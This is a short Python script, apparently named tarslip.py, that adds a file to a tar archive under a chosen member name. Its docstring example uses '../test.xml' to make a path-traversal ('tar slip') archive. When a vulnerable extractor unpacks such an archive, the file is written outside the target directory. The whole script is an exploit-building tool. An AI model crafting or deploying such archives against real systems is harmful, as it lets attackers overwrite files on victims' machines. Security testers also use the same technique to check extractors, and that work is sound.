#!/usr/bin/env python3
"""
argv 1: Tar filename
argv 2: Target file
argv 3: Destination path
e.g. 

I have my.xml and I want to make the below tar file.

:test.tar
  ../test.xml

python tarslip.py test.tar my.xml ../test.xml
"""
import tarfile
import sys

if len(sys.argv) < 4:
    sys.stderr.write("too few arguments.\n")
    sys.exit(1)

tar = tarfile.open(sys.argv[1], "a")
tar.add(sys.argv[2], arcname=sys.argv[3])
tar.close()
